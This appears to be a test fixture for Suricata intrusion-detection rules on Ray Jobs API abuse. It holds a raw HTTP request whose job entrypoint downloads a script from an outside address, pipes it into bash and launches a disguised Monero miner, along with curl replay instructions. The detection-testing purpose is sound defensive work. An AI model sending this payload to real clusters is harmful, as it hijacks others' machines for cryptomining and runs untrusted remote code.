@@ -1,0 +1,31 @@
+# Test artifact for 04-ai-infrastructure/ray_jobs_api_rce.rules
+# Should trigger SID 9000200 (Ray Jobs API submission with shell command)
+# and SID 9000202 (downloading external script).
+#
+# Replay against a Suricata sensor with the rules loaded:
+#   curl -X POST http://<test-host>:8265/api/jobs/ \
+#     -H "Content-Type: application/json" \
+#     -d @ray_jobs_api_rce.body.json
+#
+# Or convert this raw HTTP capture into a pcap with `text2pcap` and
+# replay with `tcpreplay -i lo`.
+
+POST /api/jobs/ HTTP/1.1
+Host: ray-cluster.victim.example:8265
+User-Agent: python-requests/2.31.0
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 287
+
+{
+  "entrypoint": "bash -c 'curl http://203.0.113.99/x.sh | bash; chmod +x /tmp/.kworker; /tmp/.kworker --coin monero --pool gulf.moneroocean.stream:80 --user 4xxxxxxxx --max-cpu-usage 60'",
+  "runtime_env": {},
+  "submission_id": "raysubmit_attacker_2026_04_15",
+  "metadata": {
+    "scheduling_strategy": "NodeAffinitySchedulingStrategy",
+    "node_id": "worker-7",
+    "soft": true
+  }
+}
